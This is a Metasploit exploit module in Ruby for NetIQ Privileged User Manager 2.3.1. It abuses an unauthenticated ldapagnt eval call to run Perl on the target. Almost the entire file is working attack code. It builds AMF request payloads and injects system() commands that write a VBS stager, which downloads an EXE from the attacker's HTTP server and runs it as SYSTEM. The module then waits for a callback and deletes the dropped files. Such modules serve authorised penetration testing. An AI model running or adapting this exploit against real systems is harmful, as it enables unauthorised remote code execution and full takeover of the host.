##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/file_dropper'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NetIQ Privileged User Manager 2.3.1 ldapagnt_eval() Remote Perl Code Execution',
      'Description'    => %q{
          This module abuses a lack of authorization in the NetIQ Privileged User Manager
        service (unifid.exe) to execute arbitrary perl code. The problem exists in the
        ldapagnt module. The module has been tested successfully on NetIQ PUM 2.3.1 over
        Windows 2003 SP2, which allows to execute arbitrary code with SYSTEM privileges.
      },
      'Author'         => [
        'rgod', # Vulnerability discovery and PoC
        'juan vazquez' # Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'OSVDB', '87334'],
          [ 'BID', '56539' ],
          [ 'EDB', '22738' ],
          [ 'URL', 'http://retrogod.altervista.org/9sg_novell_netiq_ldapagnt_adv.htm' ]
        ],
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500
        },
      'Platform'       => 'win',
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Windows 2003 SP2 / NetIQ Privileged User Manager 2.3.1', { }],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Nov 15 2012'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60])
      ], self.class )
  end

  def check
    data = fake_login

    print_status("Sending fake login request...")

    res = send_request_cgi(
      {
        'uri'     => '/',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "application/x-amf",
        'headers' => {
          "x-flash-version" => "11,4,402,278"
        },
        'data'    => data,
      })

    if res and res.body =~ /onResult/ and res.body =~ /Invalid user name or password/ and res.body =~ /2.3.1/
      return Exploit::CheckCode::Vulnerable
    elsif res and res.body =~ /onResult/ and res.body =~ /Invalid user name or password/
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def on_new_session(session)
    if session.type == "meterpreter"
      session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
    end

    @dropped_files.delete_if do |file|
      win_file = file.gsub("/", "\\\\")
      if session.type == "meterpreter"
        begin
          windir = session.fs.file.expand_path("%WINDIR%")
          win_file = "#{windir}\\system32\\#{win_file}"
          # Meterpreter should do this automatically as part of
          # fs.file.rm().  Until that has been implemented, remove the
          # read-only flag with a command.
          session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
          session.fs.file.rm(win_file)
          print_good("Deleted #{file}")
          true
        rescue ::Rex::Post::Meterpreter::RequestError
          false
        end

      end
    end

  end

  # Handle incoming requests from the target
  def on_request_uri(cli, request)

    vprint_status("on_request_uri called")

    if (not @exe_data)
      print_error("A request came in, but the EXE archive wasn't ready yet!")
      return
    end

    print_good("Sending the EXE payload to the target...")
    send_response(cli, @exe_data)
    @exe_sent = true
  end

  def lookup_lhost()
    # Get the source address
    if datastore['SRVHOST'] == '0.0.0.0'
      Rex::Socket.source_address('50.50.50.50')
    else
      datastore['SRVHOST']
    end
  end

  def fake_login
    data = "\x00\x00\x00\x00\x00\x01\x00\x15\x53\x50\x46\x2e\x55\x74"          #  ..........SPF.Ut
    data << "\x69\x6c\x2e\x63\x61\x6c\x6c\x4d\x6f\x64\x75\x6c\x65\x45\x78\x00" #  il.callModuleEx.
    data << "\x02\x2f\x34\x00\x00\x00\x64\x0a\x00\x00\x00\x01\x03\x00\x03\x70" #  ./4...d........p
    data << "\x6b\x74\x03\x00\x0b\x43\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73" #  kt...Credentials
    data << "\x03\x00\x04\x6e\x61\x6d\x65\x02\x00\x04\x74\x65\x73\x74\x00\x06" #  ...name...test..
    data << "\x70\x61\x73\x73\x77\x64\x02\x00\x04\x74\x65\x73\x74\x00\x00\x09" #  passwd...test...
    data << "\x00\x06\x6d\x65\x74\x68\x6f\x64\x02\x00\x05\x6c\x6f\x67\x69\x6e" #  ..method...login
    data << "\x00\x06\x6d\x6f\x64\x75\x6c\x65\x02\x00\x04\x61\x75\x74\x68\x00" #  ..module...auth.
    data << "\x03\x75\x69\x64\x06\x00\x00\x09\x00\x00\x09";                    #  .uid.......
    return data
  end

  def exploit

    data = fake_login

    print_status("Sending fake login request...")
    res = send_request_cgi(
      {
        'uri'     => '/',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "application/x-amf",
        'headers' => {
          "x-flash-version" => "11,4,402,278"
        },
        'data'    => data,
      })

    if not res or res.code != 200 or res.body !~ /svc(.+)/
      fail_with(Exploit::Failure::Unknown, 'Fake Login failed, svc not identified')
    end

    svc = $1
    svc_length = svc[1, 2].unpack("n")[0]
    svc_name = svc[3, svc_length]
    vprint_status("SVC Found: #{svc_name}")

    print_status("Generating the EXE Payload...")
    @exe_data = generate_payload_exe
    exename = Rex::Text.rand_text_alpha(1+rand(2))

    print_status("Setting up the Web Service...")
    datastore['SSL'] = false
    resource_uri = '/' + exename + '.exe'
    service_url = "http://#{lookup_lhost}:#{datastore['SRVPORT']}#{resource_uri}"
    print_status("Starting up our web service on #{service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => resource_uri
    }})
    datastore['SSL'] = true

    # http://scriptjunkie1.wordpress.com/2010/09/27/command-stagers-in-windows/
    vbs_stage = Rex::Text.rand_text_alpha(3+rand(5))
    code = "system(\"echo Set F=CreateObject(\\\"Microsoft.XMLHTTP\\\") >%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo F.Open \\\"GET\\\",\\\"#{service_url}\\\",False >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo F.Send >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo Set IA=CreateObject(\\\"ADODB.Stream\\\") >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo IA.Type=1 >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo IA.Open >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo IA.Write F.responseBody >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo IA.SaveToFile \\\"%WINDIR%\\system32\\#{exename}.exe\\\",2 >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"echo CreateObject(\\\"WScript.Shell\\\").Run \\\"%WINDIR%\\system32\\#{exename}.exe\\\" >>%WINDIR%/system32/#{vbs_stage}.vbs\");"
    code << "system(\"#{vbs_stage}.vbs\");"
    register_file_for_cleanup("#{vbs_stage}.vbs")
    register_file_for_cleanup("#{exename}.exe")
    identity = ""

    data = "\x00\x00\x00\x00\x00\x01"
    data << "\x00\x14"
    data << "SPF.Util.callModuleA"
    data << "\x00\x00"
    data << "\x00"
    data << "\x00\x02"
    data << "\x0a\x0a"
    data << "\x00\x00\x00\x01\x03"
    data << "\x00\x03"
    data << "pkt"
    data << "\x03"
    data << "\x00\x06"
    data << "method"
    data << "\x02"
    data << "\x00\x04"
    data << "eval"
    data << "\x00\x06"
    data << "module"
    data << "\x02"
    data << "\x00\x08"
    data << "ldapagnt"
    data << "\x00\x04"
    data << "Eval"
    data << "\x03"
    data << "\x00\x07"
    data << "content"
    data << "\x02"
    data << [code.length + 4].pack("n")
    data << code
    data << "\x0a\x0a1;\x0a\x0a1;"
    data << "\x00\x00\x09"
    data << "\x00\x00\x09"
    data << "\x00\x03"
    data << "uid"
    data << "\x02"
    data << [identity.length].pack("n")
    data << identity
    data << "\x00\x00\x09"
    data << "\x00\x08"
    data << "svc_name"
    data << "\x02"
    data << [svc_name.length].pack("n")
    data << svc_name
    data << "\x00\x00\x09"

    print_status("Sending the eval code request...")

    res = send_request_cgi(
      {
        'uri'     => '/',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "application/x-amf",
        'headers' => {
          "x-flash-version" => "11,4,402,278"
        },
        'data'    => data,
      })

    if res
      fail_with(Exploit::Failure::Unknown, "There was an unexpected response to the code eval request")
    else
      print_good("There wasn't a response, but this is the expected behavior...")
    end

    # wait for the data to be sent
    print_status("Waiting for the victim to request the EXE payload...")

    waited = 0
    while (not @exe_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Exploit::Failure::Unknown, "Target didn't request request the EXE payload -- Maybe it cant connect back to us?")
      end
    end

    print_status("Giving time to the payload to execute...")
    select(nil, nil, nil, 20)

    print_status("Shutting down the web service...")
    stop_service

  end
end
